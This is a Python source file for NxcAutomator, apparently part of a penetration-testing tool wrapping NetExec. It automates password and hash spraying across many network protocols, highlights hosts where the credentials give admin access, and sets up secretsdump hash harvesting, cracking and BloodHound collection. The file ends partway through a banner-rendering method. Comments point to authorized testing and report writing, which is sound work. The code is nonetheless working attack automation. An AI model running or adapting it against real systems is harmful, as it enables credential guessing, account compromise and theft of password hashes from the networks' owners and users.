"""NxcAutomator — the orchestrator that drives the whole pipeline:
spray → live results → detect DC → post-exploit enum/modules/secretsdump →
crack → BloodHound → exports."""

import hashlib
import os
import random
import shlex
import shutil
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Lock

from .bloodhound import BloodHoundRunner
from .cache import HostCache
from .constants import (ALL_PROTOCOLS, AUTH_RESPONSE_PATTERNS, BANNER_WIDTH,
                        BLUE, BOLD, CACHE_DEFAULT_PATH, CACHE_DEFAULT_TTL,
                        DEAD_CACHE_DEFAULT_TTL, RANGE_EXPAND_CAP,
                        CONNECTIVITY_TIMEOUT_PATTERNS, CRACK_DEFAULT_TIMEOUT,
                        CYAN, DEFAULT_WORKERS, DIM, GREEN, HASH_AUTH_PROTOCOLS,
                        HASH_DUMP_LINE_RE, HASH_LMNT_PATTERN, HASH_NT_PATTERN,
                        ICON_BLOODHOUND, ICON_CRACK, ICON_FAIL, ICON_FINDING,
                        ICON_HARVEST, ICON_HOST, ICON_NOOP, ICON_OK,
                        ICON_PWN3D, ICON_SKIP, ICON_SUBTASK, ICON_TIMEOUT,
                        ICON_WARN, KERBEROS_AUTH_PROTOCOLS,
                        KRB_AS_REP_USER_RE, KRB_TGS_REP_USER_RE,
                        LDAP_ENUM_ACTIONS, LOCAL_AUTH_PROTOCOLS,
                        LOCKOUT_DURATION_RE, LOCKOUT_THRESHOLD_RE, MAX_RETRY,
                        NETEXEC_TIMEOUT, NULL_SESSION_CREDS, PROTOCOL_PORTS,
                        RED, RESET, ROCKYOU_DOWNLOAD_URL, SMB_DOMAIN_RE,
                        SMB_ENUM_ACTIONS, SMB_NAME_RE, SMB_SECRETS_ACTIONS,
                        SUBPROCESS_TIMEOUT, V_DEBUG, V_NORMAL, V_QUIET,
                        V_VERBOSE, WORDLIST_DEFAULT_PATHS, YELLOW,
                        AttemptClassification, ParsedStatus, TaskKey)
from .cracker import HashCracker
from .loot import LootStore
from .resolver import HostnameResolver
from .scanner import NmapScanner
from .types import Credential, NxcActionResult
from ._utils import _term_width, _truncate_path, _truncate_text


class NxcAutomator:
    """Run nxc across all protocols with combination or linear credential pairing."""

    def __init__(
        self,
        target: str,
        user: str | None = None,
        password: str | None = None,
        nthash: str | None = None,
        combo: str | None = None,
        domain: str | None = None,
        kerberos: bool = False,
        null_session: bool = False,
        output: str | None = None,
        workers: int = DEFAULT_WORKERS,
        mode: str = "combination",
        nmap_enabled: bool = False,
        cache_enabled: bool = True,
        cache_ttl: int = CACHE_DEFAULT_TTL,
        dead_ttl: int = DEAD_CACHE_DEFAULT_TTL,
        cache_path: str | None = None,
        scan_only: bool = False,
        rescan: bool = False,
        verbosity: int = V_NORMAL,
        enum_enabled: bool = False,
        modules: str | None = None,
        bloodhound_enabled: bool = False,
        bloodhound_force: bool = False,
        bloodhound_ttl: int = CACHE_DEFAULT_TTL,
        loot_dir: str = "loot",
        cmd_log: str | None = None,
        cmd_log_disabled: bool = False,
        delay: float = 0.0,
        jitter: float = 0.0,
        netexec_timeout: int = NETEXEC_TIMEOUT,
        subprocess_timeout: int = SUBPROCESS_TIMEOUT,
        max_retry: int = MAX_RETRY,
        stop_on_success: bool = False,
        only_protocols: str | None = None,
        exclude_protocols: str | None = None,
        secretsdump: bool = False,
        grow_combo: str | None = None,
        export_json: str | None = None,
        export_csv: str | None = None,
        crack_enabled: bool = False,
        wordlist: str | None = None,
        cracker: str = "auto",
        crack_rules: str | None = None,
        crack_timeout: int = CRACK_DEFAULT_TIMEOUT,
        strict: bool = False,
        resolve_enabled: bool = True,
        resolve_timeout: float = 2.0,
        no_banner: bool = False,
        skip_tried: bool = False,
        rerun_after: int = 0,
        reachability_check: bool = True,
    ):
        self.targets = self._read_value_or_file(target)
        self.mode = mode.lower()
        self.domain = domain
        self.kerberos = kerberos
        self.null_session = null_session

        self.user_arg = user
        self.password_arg = password
        self.hash_arg = nthash
        self.combo_arg = combo

        # Kept for banner display
        self.users = self._read_value_or_file(user) if user else []
        self.passwords = self._read_value_or_file(password) if password else []
        self.hashes = self._read_value_or_file(nthash) if nthash else []

        self.credentials = self._build_credentials()

        self.workers = workers
        self.delay = max(0.0, delay)
        self.jitter = max(0.0, jitter)
        self.netexec_timeout = netexec_timeout
        self.subprocess_timeout = subprocess_timeout
        self.max_retry = max_retry
        self.stop_on_success = stop_on_success
        self.only_protocols = self._parse_protocol_set(only_protocols, "only")
        self.exclude_protocols = self._parse_protocol_set(exclude_protocols, "exclude") or set()
        self.lock = Lock()
        self.cmd_log_lock = Lock()
        self.completed = 0
        self.total_tasks = 0
        ts = datetime.now().strftime("%H-%M-%S-%f")[:-3]
        # Default log dir: ./logs/ — keeps the cwd tidy. Created lazily so the
        # tool still works in read-only / unwriteable cwds (the writes fail
        # gracefully with a recorded error instead of a stack trace).
        logs_dir = Path("logs")
        try:
            logs_dir.mkdir(exist_ok=True)
        except OSError:
            logs_dir = Path(".")  # fall back to cwd
        self.log_file = output if output else str(logs_dir / f"{ts}.txt")
        if cmd_log_disabled:
            self.cmd_log_path: Path | None = None
        else:
            self.cmd_log_path = Path(cmd_log) if cmd_log else logs_dir / f"commands-{ts}.log"
        self._cmd_log_initialized = False

        self.verbosity = verbosity
        self.nmap_enabled = nmap_enabled
        self.scan_only = scan_only
        self.rescan = rescan
        self.scanner = (
            NmapScanner(ports=self._all_known_ports(), log_cmd=self._log_command)
            if nmap_enabled else None
        )
        # Cache is also useful for DC/bloodhound dedup even without --nmap,
        # and is required by --skip-tried (the tried_creds table lives here).
        cache_useful = (nmap_enabled or bloodhound_enabled or skip_tried) and cache_enabled
        resolved_cache_path = Path(cache_path).expanduser() if cache_path else CACHE_DEFAULT_PATH
        self.cache = (
            HostCache(resolved_cache_path, ttl=cache_ttl, dead_ttl=dead_ttl)
            if cache_useful else None
        )

        self.enum_enabled = enum_enabled
        self.modules = [m.strip() for m in modules.split(",") if m.strip()] if modules else []
        self.loot = LootStore(Path(loot_dir))
        self.bloodhound_enabled = bloodhound_enabled
        self.bloodhound_runner = (
            BloodHoundRunner(
                self.cache, self.loot,
                ttl=bloodhound_ttl, force=bloodhound_force,
                log_cmd=self._log_command,
            )
            if bloodhound_enabled else None
        )

        self.secretsdump = secretsdump
        self.grow_combo_path = Path(grow_combo) if grow_combo else None
        self.export_json_path = Path(export_json) if export_json else None
        self.export_csv_path = Path(export_csv) if export_csv else None

        self.crack_enabled = crack_enabled
        self.cracker = (
            HashCracker(self.loot, wordlist=wordlist, cracker=cracker,
                        rules=crack_rules, timeout=crack_timeout,
                        log_cmd=self._log_command)
            if crack_enabled else None
        )
        self.cracked_creds: list[dict] = []  # post-crack (user, plain) records
        self.dead_hosts: list[str] = []      # targets with no open port / unreachable
        self.bloodhound_results: list[dict] = []  # domain, dc_ip, path, success (for final report)
        self.strict = strict
        self.resolver = HostnameResolver(timeout=resolve_timeout, enabled=resolve_enabled)
        self.no_banner = no_banner
        self.skip_tried = skip_tried
        self.rerun_after = max(0, int(rerun_after))
        self.skipped_already_tried = 0  # counter for the FINAL REPORT
        self.reachability_check = reachability_check
        self.strict_errors: list[str] = []

        # Cross-host state populated during the run.
        self.valid_creds: list[dict] = []
        self.domain_hosts: dict[str, set[str]] = {}  # domain → {hostnames}
        self.host_domain: dict[str, str] = {}        # host → domain
        self.host_names: dict[str, str] = {}         # host → NetBIOS name from SMB banner
        self.harvested_hashes: list[dict] = []       # auto-secretsdump output
        self.lockout_warnings: list[dict] = []       # detected pass-pol findings
        self.started_at = datetime.now()

    @staticmethod
    def _parse_protocol_set(value: str | None, flag: str) -> set[str] | None:
        """Parse a comma-separated protocol list, validating against ALL_PROTOCOLS."""
        if not value:
            return None
        protos = {p.strip().lower() for p in value.split(",") if p.strip()}
        unknown = protos - set(ALL_PROTOCOLS)
        if unknown:
            raise ValueError(
                f"--{flag}: unknown protocol(s) {sorted(unknown)}. "
                f"Valid: {', '.join(ALL_PROTOCOLS)}"
            )
        return protos

    @staticmethod
    def _all_known_ports() -> list[int]:
        seen: list[int] = []
        for ports in PROTOCOL_PORTS.values():
            for port in ports:
                if port not in seen:
                    seen.append(port)
        return seen

    def _vprint(self, level: int, msg: str):
        """Emit msg only when current verbosity >= level. Plays nice with the progress bar."""
        if self.verbosity < level:
            return
        with self.lock:
            sys.stderr.write("\r" + " " * _term_width() + "\r")
            sys.stderr.flush()
            print(msg, flush=True)
            self._redraw_progress()

    def _vprint_cmd(self, label: str, cmd: list[str]):
        """Verbose: dump the command line about to be executed."""
        self._vprint(V_VERBOSE, f"  {DIM}$ [{label}] {shlex.join(cmd)}{RESET}")

    def _log_command(self, label: str, cmd: list[str], target: str | None = None):
        """Append a shell-pasteable copy of cmd to commands.log AND emit verbose dump.

        Format is OSCP-report friendly: comment header with timestamp + label,
        followed by the exact command (shell-quoted), one entry per call."""
        self._vprint_cmd(label, cmd)
        if not self.cmd_log_path:
            return
        with self.cmd_log_lock:
            mode = "a" if self._cmd_log_initialized else "w"
            with open(self.cmd_log_path, mode) as fh:
                if not self._cmd_log_initialized:
                    fh.write(
                        "# NetExec Automator — commands transcript\n"
                        f"# Started: {datetime.now().isoformat(timespec='seconds')}\n"
                        "# Each block: '# <iso ts> [label] target=<host>' followed by\n"
                        "# the exact shell-quoted command. Safe to copy-paste into reports.\n\n"
                    )
                    self._cmd_log_initialized = True
                ts_iso = datetime.now().isoformat(timespec="seconds")
                tgt = f" target={target}" if target else ""
                fh.write(f"# {ts_iso} [{label}]{tgt}\n")
                fh.write(shlex.join(cmd) + "\n\n")

    @staticmethod
    def _read_lines(path: str) -> list[str]:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]

    @classmethod
    def _read_value_or_file(cls, source: str) -> list[str]:
        """Return direct value as one-item list, or load non-empty lines from file."""
        return cls._read_lines(source) if os.path.isfile(source) else [source]

    @staticmethod
    def _auth_scope(local_auth: bool) -> str:
        return "local" if local_auth else "domain"

    def _task_label(self, protocol: str, local_auth: bool) -> str:
        """Return standardized display label for protocol/auth scope."""
        return f"{protocol.upper()} ({self._auth_scope(local_auth)})"

    def _build_protocol_tasks(self, open_ports: set[int] | None = None) -> list[TaskKey]:
        """Generate (protocol, local_auth) tasks. Filters by --only / --exclude
        and (when --nmap is on) drops protocols whose mapped ports are all closed."""
        tasks: list[TaskKey] = []
        for protocol in ALL_PROTOCOLS:
            if self.only_protocols and protocol not in self.only_protocols:
                continue
            if protocol in self.exclude_protocols:
                continue
            if open_ports is not None:
                mapped = PROTOCOL_PORTS.get(protocol, [])
                if not any(p in open_ports for p in mapped):
                    continue
            tasks.append((protocol, False))
            if protocol in LOCAL_AUTH_PROTOCOLS:
                tasks.append((protocol, True))
        return tasks

    @staticmethod
    def _parse_hash_value(value: str) -> tuple[str | None, str]:
        """Return (lmhash, nthash). Raises if format is invalid."""
        v = value.strip()
        if HASH_LMNT_PATTERN.match(v):
            lm, nt = v.split(":", 1)
            return lm, nt
        if HASH_NT_PATTERN.match(v):
            return None, v
        raise ValueError(
            f"Invalid hash {v!r}: expected 32 hex chars (NT) or 32:32 hex (LM:NT)."
        )

    @classmethod
    def _parse_combo_line(cls, line: str) -> Credential | None:
        """Parse one 'user:secret' line. Auto-detects whether secret is NT/LM:NT hash
        or password. Returns None for blank or comment lines."""
        raw = line.rstrip("\n\r")
        stripped = raw.strip()
        if not stripped or stripped.startswith("#"):
            return None
        if ":" not in stripped:
            raise ValueError(f"Malformed combo line (missing ':'): {stripped!r}")
        user, _, secret = raw.partition(":")
        user = user.strip()
        # Don't strip the secret — passwords may legitimately have surrounding whitespace.
        if HASH_LMNT_PATTERN.match(secret.strip()):
            lm, nt = secret.strip().split(":", 1)
            return Credential(user=user, lmhash=lm, nthash=nt)
        if HASH_NT_PATTERN.match(secret.strip()):
            return Credential(user=user, nthash=secret.strip())
        return Credential(user=user, password=secret)

    @classmethod
    def _load_combo_file(cls, path: str) -> list[Credential]:
        creds: list[Credential] = []
        with open(path) as fh:
            for lineno, line in enumerate(fh, start=1):
                try:
                    cred = cls._parse_combo_line(line)
                except ValueError as exc:
                    raise ValueError(f"{path}:{lineno}: {exc}") from None
                if cred is not None:
                    creds.append(cred)
        if not creds:
            raise ValueError(f"Combo file {path!r} contained no usable credentials.")
        return creds

    def _build_credentials(self) -> list[Credential]:
        """Compose the credential list from null/guest, combo file, or -u/-p/-H pools."""
        creds: list[Credential] = []

        # Null-session and Guest/anonymous fast-checks go first (cheapest signals).
        if self.null_session:
            creds.extend(Credential(user=u, password=p) for u, p in NULL_SESSION_CREDS)

        if self.combo_arg:
            if self.password_arg or self.hash_arg or self.user_arg:
                raise ValueError("--combo cannot be combined with -u/-p/-H.")
            creds.extend(self._load_combo_file(self.combo_arg))
            return creds

        # If only null-session was requested (no -u), that's a valid configuration.
        if not self.user_arg:
            if creds:
                return creds
            raise ValueError(
                "Provide credentials via -u/-p, -u/-H, --combo, or --null-session."
            )

        if not self.password_arg and not self.hash_arg:
            raise ValueError("With -u you must also provide -p, -H, or use --combo.")

        if self.mode == "combination":
            for u in self.users:
                for p in self.passwords:
                    creds.append(Credential(user=u, password=p))
                for h in self.hashes:
                    lm, nt = self._parse_hash_value(h)
                    creds.append(Credential(user=u, lmhash=lm, nthash=nt))
            return creds

        if self.mode == "linear":
            if self.passwords and self.hashes:
                raise ValueError(
                    "Linear mode accepts -p or -H, not both. Use --combo for mixed lists."
                )
            pool = self.passwords or self.hashes
            if len(self.users) != len(pool):
                raise ValueError(
                    "Linear mode requires user and secret lists to have the same length."
                )
            if self.passwords:
                creds.extend(Credential(user=u, password=p) for u, p in zip(self.users, pool))
            else:
                for u, h in zip(self.users, pool):
                    lm, nt = self._parse_hash_value(h)
                    creds.append(Credential(user=u, lmhash=lm, nthash=nt))
            return creds

        raise ValueError(f"Unsupported mode: {self.mode}")

    def _redraw_progress(self):
        if self.total_tasks > 0:
            bar_len = 20
            filled = int(bar_len * self.completed / self.total_tasks)
            bar = f"{'█' * filled}{'░' * (bar_len - filled)}"
            pct = int(100 * self.completed / self.total_tasks)
            sys.stderr.write(f"\r  {DIM}{bar} {pct:3d}% ({self.completed}/{self.total_tasks}){RESET}")
            sys.stderr.flush()

    def _update_progress(self):
        with self.lock:
            self.completed += 1
            self._redraw_progress()

    def _skip_progress(self, count: int):
        with self.lock:
            self.completed += count
            self._redraw_progress()

    def _print_live(self, msg: str):
        """Print a finding in real-time, temporarily clearing the progress bar."""
        with self.lock:
            sys.stderr.write("\r" + " " * _term_width() + "\r")
            sys.stderr.flush()
            print(msg, flush=True)
            self._redraw_progress()

    def _build_nxc_command(
        self, protocol: str, target: str, credential: Credential, local_auth: bool
    ) -> list[str]:
        cmd = ["nxc", protocol, target, *credential.to_cli_args()]
        if local_auth:
            cmd.append("--local-auth")
        elif self.domain:
            # -d is only meaningful for domain auth (and gets ignored / rejected with --local-auth)
            cmd.extend(["-d", self.domain])
        if self.kerberos and not local_auth and protocol in KERBEROS_AUTH_PROTOCOLS:
            cmd.append("-k")
        cmd.extend(["--timeout", str(self.netexec_timeout), "--log", self.log_file])
        return cmd

    @staticmethod
    def _credential_supported(credential: Credential, protocol: str) -> bool:
        """Skip hash creds on protocols nxc doesn't expose -H for (ssh/ftp/vnc/nfs)."""
        if credential.is_hash and protocol not in HASH_AUTH_PROTOCOLS:
            return False
        return True

    @staticmethod
    def _is_pwn3d(msg: str) -> bool:
        """nxc appends '(Pwn3d!)' when the auth grants admin on the host."""
        return "(Pwn3d!)" in msg or "(pwn3d!)" in msg.lower()

    def _report_success_lines(self, stdout: str, protocol: str, local_auth: bool):
        for raw_line in stdout.split("\n"):
            marker, msg = self._parse_nxc_line(raw_line.strip())
            if marker == "[+]":
                label = self._task_label(protocol, local_auth)
                if self._is_pwn3d(msg):
                    # Loud red banner for admin-on-host — this is the report-worthy line.
                    self._print_live(
                        f"  {RED}{BOLD}💀 PWN3D! {label}{RESET} "
                        f"{RED}{BOLD}{msg}{RESET}"
                    )
                else:
                    self._print_live(
                        f"  {GREEN}{BOLD}⚡ {label}{RESET} {GREEN}{msg}{RESET}"
                    )
            elif marker == "[-]" and self.verbosity >= V_VERBOSE:
                label = self._task_label(protocol, local_auth)
                self._vprint(V_VERBOSE, f"  {DIM}✘ {label} {msg}{RESET}")
            elif marker == "[*]" and self.verbosity >= V_DEBUG:
                label = self._task_label(protocol, local_auth)
                self._vprint(V_DEBUG, f"  {DIM}* {label} {msg}{RESET}")

    @staticmethod
    def _parse_status_blocks(blocks: list[str]) -> list[ParsedStatus]:
        parsed: list[ParsedStatus] = []
        for block in blocks:
            for line in block.split("\n"):
                line = line.strip()
                if not line:
                    continue
                marker, msg = NxcAutomator._parse_nxc_line(line)
                if marker in ("[+]", "[-]", "[!]"):
                    parsed.append((marker, msg))
        return parsed

    @staticmethod
    def _status_icon(parsed: list[ParsedStatus]) -> str:
        has_success = any(marker == "[+]" for marker, _ in parsed)
        has_skip = any(marker == "[!]" for marker, _ in parsed)
        if has_success:
            return f"{GREEN}✔{RESET}"
        if has_skip:
            return f"{YELLOW}⏱{RESET}"
        return f"{RED}✘{RESET}"

    @staticmethod
    def _contains_any_pattern(text: str, patterns: tuple[str, ...]) -> bool:
        return any(pattern in text for pattern in patterns)

    def _classify_attempt_output(self, stdout: str, stderr: str) -> AttemptClassification:
        """Classify one nxc run to decide timeout skip behavior."""
        combined = "\n".join(part for part in (stdout, stderr) if part).lower()
        if not combined:
            return "ambiguous"

        # Credential-related failures mean the service responded, so they should
        # not contribute to consecutive connectivity timeout skips.
        if self._contains_any_pattern(combined, AUTH_RESPONSE_PATTERNS):
            return "credential_response"

        if self._contains_any_pattern(combined, CONNECTIVITY_TIMEOUT_PATTERNS):
            return "connectivity_timeout"

        for raw_line in (stdout + "\n" + stderr).split("\n"):
            marker, _ = self._parse_nxc_line(raw_line.strip())
            if marker in ("[+]", "[-]", "[*]", "[!]"):
                return "credential_response"

        return "ambiguous"

    def _format_stderr_block(self, stderr: str, fallback_marker: str) -> str | None:
        """Convert stderr lines to parseable status lines for result summary."""
        formatted: list[str] = []
        for raw_line in stderr.split("\n"):
            line = raw_line.strip()
            if not line:
                continue
            marker, msg = self._parse_nxc_line(line)
            if marker in ("[+]", "[-]", "[!]"):
                formatted.append(f"{marker} {msg}")
            else:
                formatted.append(f"{fallback_marker} {line}")
        return "\n".join(formatted) if formatted else None

    def _sleep_between_attempts(self):
        """Optional pacing between credential attempts for lockout-safety / low-power."""
        if self.delay <= 0 and self.jitter <= 0:
            return
        nap = self.delay + (random.uniform(0, self.jitter) if self.jitter > 0 else 0)
        if nap > 0:
            time.sleep(nap)

    @staticmethod
    def _credential_fingerprint(credential: Credential) -> str:
        """Stable SHA1 of just the secret (password or hash). The user is
        already a separate PK column in tried_creds — this lets us look up
        '(target, protocol, local_auth, user, secret_hash)' without ever
        persisting the plaintext password to disk."""
        secret = credential.nthash or (credential.password or "")
        if credential.lmhash:
            secret = f"{credential.lmhash}:{secret}"
        return hashlib.sha1(secret.encode("utf-8", errors="replace")).hexdigest()

    def _record_attempt_in_cache(
        self,
        target: str,
        protocol: str,
        local_auth: bool,
        credential: Credential,
        secret_fp: str,
        result: str,
        pwn3d: bool,
    ):
        """Persist a single (target, proto, scope, user, secret) attempt to
        the SQLite cache for future --skip-tried lookups. No-op when cache
        is disabled."""
        if not (self.skip_tried and self.cache is not None):
            return
        try:
            self.cache.record_attempt(
                target, protocol, local_auth, credential.user, secret_fp,
                self.domain, result, pwn3d,
            )
        except Exception as exc:  # noqa: BLE001 — cache write should never break the spray
            self._vprint(V_VERBOSE, f"  {DIM}cache record_attempt failed: {exc}{RESET}")

    def _run_protocol_task(self, protocol: str, target: str, local_auth: bool = False) -> list[str]:
        """Run all credential pairs for one protocol/auth-type, return captured output."""
        output_lines: list[str] = []
        timeout_count = 0
        total_per_task = len(self.credentials)
        ran = 0
        for idx, credential in enumerate(self.credentials):
            if idx > 0:
                self._sleep_between_attempts()
            if not self._credential_supported(credential, protocol):
                # Hash creds aren't usable on ssh/ftp/vnc/nfs — count as done, move on.
                self._vprint(
                    V_VERBOSE,
                    f"  {DIM}↷ skip {self._task_label(protocol, local_auth)} "
                    f"for hash-only cred {credential.user!r}{RESET}",
                )
                ran += 1
                self._update_progress()
                continue

            # --skip-tried: check the SQLite cache for a prior attempt of this
            # exact (target, protocol, scope, user, secret) combination.
            secret_fp = self._credential_fingerprint(credential)
            if self.skip_tried and self.cache is not None:
                prior = self.cache.was_tried(
                    target, protocol, local_auth, credential.user,
                    secret_fp, rerun_after=self.rerun_after,
                )
                if prior:
                    self._vprint(
                        V_VERBOSE,
                        f"  {DIM}↷ already tried ({prior}): {self._task_label(protocol, local_auth)} "
                        f"{credential.user or '<empty>'}{RESET}",
                    )
                    self.skipped_already_tried += 1
                    ran += 1
                    self._update_progress()
                    continue

            cmd = self._build_nxc_command(protocol, target, credential, local_auth)
            self._log_command(self._task_label(protocol, local_auth), cmd, target=target)
            attempt_result = "fail"
            attempt_pwn3d = False
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=self.subprocess_timeout)
                stdout = (result.stdout or "").strip()
                stderr = (result.stderr or "").strip()
                classification = self._classify_attempt_output(stdout, stderr)

                if stdout:
                    output_lines.append(stdout)
                    self._report_success_lines(stdout, protocol, local_auth)

                # stderr often carries connection errors; include it when stdout is empty
                # or when we classified this attempt as a connectivity timeout.
                if stderr and (not stdout or classification == "connectivity_timeout"):
                    marker = "[!]" if classification == "connectivity_timeout" else "[-]"
                    stderr_block = self._format_stderr_block(stderr, marker)
                    if stderr_block:
                        output_lines.append(stderr_block)

                if classification == "connectivity_timeout":
                    timeout_count += 1
                    attempt_result = "timeout"
                else:
                    timeout_count = 0

                # Mark this attempt as successful for skip-tried bookkeeping;
                # pwn3d annotation is separate (admin-on-host).
                if "[+]" in stdout:
                    attempt_result = "ok"
                    attempt_pwn3d = self._is_pwn3d(stdout)

                # Stop-on-success: bail out of this protocol/host as soon as we
                # see a [+] line, so we don't keep trying the rest of the
                # credentials (and risk account lockout).
                if self.stop_on_success and "[+]" in stdout:
                    self._record_attempt_in_cache(
                        target, protocol, local_auth, credential, secret_fp,
                        attempt_result, attempt_pwn3d,
                    )
                    ran += 1
                    self._update_progress()
                    remaining = total_per_task - ran
                    if remaining > 0:
                        self._skip_progress(remaining)
                    label = self._task_label(protocol, local_auth)
                    self._vprint(
                        V_VERBOSE,
                        f"  {DIM}↷ stop-on-success: {label} → skipping "
                        f"remaining {remaining} cred(s) on this host{RESET}",
                    )
                    return output_lines
            except subprocess.TimeoutExpired:
                timeout_count += 1
                attempt_result = "timeout"

            self._record_attempt_in_cache(
                target, protocol, local_auth, credential, secret_fp,
                attempt_result, attempt_pwn3d,
            )
            ran += 1
            self._update_progress()

            if timeout_count >= self.max_retry:
                # Skip remaining credentials for this protocol after repeated timeouts.
                output_lines.append(f"[!] {self.max_retry} consecutive timeouts — skipped")
                label = self._task_label(protocol, local_auth)
                self._print_live(
                    f"  {YELLOW}⏱ {label}{RESET} {DIM}{self.max_retry} consecutive timeouts — skipping{RESET}"
                )
                remaining = total_per_task - ran
                if remaining > 0:
                    self._skip_progress(remaining)
                break
        return output_lines

    @staticmethod
    def _parse_nxc_line(line: str) -> tuple[str | None, str]:
        """Extract status marker and message from nxc output.

        'SMB  10.x.x.x  445  DC01  [+] dom\\user:pass' -> ('[+]', 'dom\\user:pass')
        """
        for marker in ("[+]", "[-]", "[*]", "[!]"):
            idx = line.find(marker)
            if idx != -1:
                return marker, line[idx + 4:].strip()
        return None, line.strip()

    @staticmethod
    def _extract_target_info(results: dict) -> str | None:
        """Get first [*] info line to display target OS/host details once."""
        for blocks in results.values():
            for block in blocks:
                for line in block.split("\n"):
                    if "[*]" in line:
                        idx = line.find("[*]")
                        return line[idx + 4:].strip()
        return None

    def _credential_summary(self) -> str:
        """Compact one-liner describing credential composition for the banner."""
        null_users = {u for u, _ in NULL_SESSION_CREDS}
        n_pwd = sum(
            1 for c in self.credentials
            if not c.is_hash and c.user not in null_users
        )
        n_hash = sum(1 for c in self.credentials if c.is_hash)
        n_quick = sum(1 for c in self.credentials if c.user in null_users and not c.is_hash)
        parts: list[str] = []
        if n_pwd:
            parts.append(f"{n_pwd} pwd")
        if n_hash:
            parts.append(f"{n_hash} hash")
        if n_quick:
            parts.append(f"{n_quick} anon (null/guest)")
        return " · ".join(parts) if parts else "—"

    def _auth_options_summary(self) -> str:
        parts: list[str] = []
        if self.domain:
            parts.append(f"domain={self.domain}")
        if self.kerberos:
            parts.append("kerberos")
        if self.null_session:
            parts.append("null-session")
        if self.combo_arg:
            parts.append(f"combo={os.path.basename(self.combo_arg)}")
        return " · ".join(parts) if parts else "—"

    def _post_exploit_summary(self) -> str:
        parts: list[str] = []
        if self.enum_enabled:
            parts.append("enum(smb+ldap)")
        if self.modules:
            parts.append(f"modules={','.join(self.modules)}")
        if self.secretsdump:
            parts.append("secretsdump")
        if self.crack_enabled:
            parts.append("crack")
        if self.bloodhound_enabled:
            parts.append("bloodhound")
        return " · ".join(parts) if parts else "—"

    # ---- banner rendering -------------------------------------------------

    # The decorative banner is exactly _BANNER_WIDTH columns wide. The
    # run-summary table beneath it is padded to the same width so the two
    # blocks read as one coherent header instead of two stacked rectangles
    # of different sizes.
    _BANNER_WIDTH = 72
    # 2-column row layout (one row total = 72 cols):
    #   2 lead spaces + KEY1 + " │ " + VAL1 + " │ " + KEY2 + " │ " + VAL2
    #     = 2 + 13 + 3 + 19 + 3 + 11 + 3 + 18 = 72
    _CFG_KEY_W = 13
    _CFG_VAL_W = 19
    _CFG_KEY2_W = 11
    _CFG_VAL2_W = 18

    def _print_scan_banner(self, total_attempts: int):
        from .banner import render_startup_banner

        # Decorative banner (ASCII art + quote + credits) — suppressed
        # entirely by --no-banner or in --quiet mode.
        if not self.no_banner:
            print()
            print(render_startup_banner(width=self._BANNER_WIDTH))
            print()

        nmap_status = "ON" if self.nmap_enabled else "OFF"
        cache_status = "ON" if self.cache else ("OFF" if (self.nmap_enabled or self.bloodhound_enabled) else "n/a")
        verbosity_label = {V_DEBUG: "DEBUG", V_VERBOSE: "VERBOSE", V_NORMAL: "NORMAL", V_QUIET: "QUIET"}.get(self.verbosity, "NORMAL")
        # Truncate paths to whatever the cell budgets allow so the right border doesn't slip.
        cmd_log_str = _truncate_path(self.cmd_log_path, budget=self._CFG_VAL_W) if self.cmd_log_path else "disabled"
        resolve_str = "ON" if self.resolver.enabled else "OFF"
        loot_str = _truncate_path(self.loot.root, budget=self._CFG_VAL_W)
        log_str = _truncate_path(self.log_file, budget=self._CFG_VAL2_W)

        # Build the 2-column rows. Each is (key1, val1, key2, val2). Use
        # None for key2 to span the whole row.
        rows: list[tuple[str, str, str | None, str | None]] = [
            ("Targets",      str(len(self.targets)),           "Protocols",   f"{len(ALL_PROTOCOLS)} (+local auth)"),
            ("Credentials",  str(len(self.credentials)),       "Workers",     str(self.workers)),
            ("Composition",  self._credential_summary(),       None,          None),  # may be long → full row
            ("Auth opts",    self._auth_options_summary(),     "DNS PTR",     resolve_str),
            ("Pre-scan",     nmap_status,                      "Cache",       cache_status),
            ("Post-exploit", self._post_exploit_summary(),     "Verbosity",   verbosity_label),
            ("Loot dir",     loot_str,                         "Log file",    log_str),
            ("Cmd log",      cmd_log_str,                      "Mode",        self.mode.upper()),
        ]

        pacing = self._pacing_summary()
        if pacing:
            rows.append(("Pacing", pacing, None, None))
        filters_summary = self._filters_summary()
        if filters_summary:
            rows.append(("Filters", filters_summary, None, None))
        if self.crack_enabled and self.cracker:
            wl = self.cracker.find_wordlist()
            wl_str = _truncate_path(wl) if wl else "missing"
            crack_str = f"{self.cracker.cracker() or '?'} · wordlist={wl_str}"
            if self.cracker.rules:
                crack_str += f" · rules={Path(self.cracker.rules).name}"
            rows.append(("Cracking", crack_str, None, None))

        if self.skip_tried and self.cache is not None:
            tried_n = self.cache.count_tried()
            rerun = f"rerun-after={self.rerun_after}s" if self.rerun_after else "no rerun"
            rows.append(("Incremental", f"skip-tried · {tried_n} prior entries · {rerun}",
                         None, None))

        # Header / footer bar at the same width as the decorative banner.
        bar = "─" * self._BANNER_WIDTH
        print(f"{DIM}{bar}{RESET}")
        for k1, v1, k2, v2 in rows:
            print(self._cfg_row(k1, v1, k2, v2))
        print(f"{DIM}{bar}{RESET}")

        # Footer: scan-only banner or task count
        if self.scan_only:
            print(f"  {ICON_WARN} {YELLOW}{BOLD}scan-only mode — no auth attempts will run{RESET}")
        else:
            label = f"~{total_attempts}" if self.nmap_enabled else f"{total_attempts}"
            note = f" {DIM}(upper bound, filtered by nmap){RESET}" if self.nmap_enabled else ""
            print(f"  {DIM}Total tasks queued:{RESET} {BOLD}{label}{RESET}{note}")
        print()

    @staticmethod
    def _pad_visible(s: str, width: int) -> str:
        """Like str.ljust but uses _visible_len so emoji and ANSI don't
        miscount columns."""
        from .banner import _visible_len
        pad = max(0, width - _visible_len(s))
        return s + " " * pad

    def _cfg_row(self, k1: str, v1: str, k2: str | None, v2: str | None) -> str:
        """Render one config-table row, padded so the right edge lands at
        exactly _BANNER_WIDTH columns regardless of wide-emoji or ANSI.

        Uses _truncate_text (which counts visible columns including wide
        emoji) so banner cells like 'Composition: 3 pwd · 2 hash · 3 anon
        (null/guest)' or a comma-separated modules list don't slip off
        the grid when they exceed the cell budget."""
        if k2 is None:
            v1_budget = self._BANNER_WIDTH - 2 - self._CFG_KEY_W - 3
            v1_clip = _truncate_text(v1, v1_budget)
            return f"  {self._pad_visible(k1, self._CFG_KEY_W)} {DIM}│{RESET} {BOLD}{self._pad_visible(v1_clip, v1_budget)}{RESET}"
